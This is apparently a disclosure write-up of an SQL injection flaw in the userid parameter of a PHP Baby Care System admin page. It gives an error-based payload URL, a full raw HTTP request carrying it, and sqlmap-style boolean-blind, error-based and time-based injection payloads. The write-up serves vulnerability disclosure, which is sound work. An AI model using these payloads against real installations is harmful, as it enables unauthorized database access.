## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html


Vulnerability file: /BabyCare/admin/uesrs.php&action=display&value=Hide&userid=

![image](https://user-images.githubusercontent.com/54017627/161356353-ed05fce2-7ad0-4f82-ba55-eddd9a8948ea.png)

Vulnerability location: /BabyCare/admin.php?id=users&action=display&value=Hide&userid=3 //uesrid is Injection point

[+]Payload: /BabyCare/admin.php?id=users&action=display&value=Hide&userid=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+  //userid is Injection point

```sql
GET /BabyCare/admin.php?id=users&action=display&value=Hide&userid=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161356446-b8a42d72-b863-46be-abde-72293066173f.png)

```sql
---
Parameter: userid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=users&action=display&value=Hide&userid=3' RLIKE (SELECT (CASE WHEN (4266=4266) THEN 3 ELSE 0x28 END))-- anKB

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=users&action=display&value=Hide&userid=3' AND (SELECT 6721 FROM(SELECT COUNT(*),CONCAT(0x71787a7671,(SELECT (ELT(6721=6721,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VDvY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=users&action=display&value=Hide&userid=3' AND (SELECT 4203 FROM (SELECT(SLEEP(5)))ArnD)-- lMLp
---
```

![image](https://user-images.githubusercontent.com/54017627/161356459-c7e30dce-0409-4f33-bbb2-f01d3880d198.png)
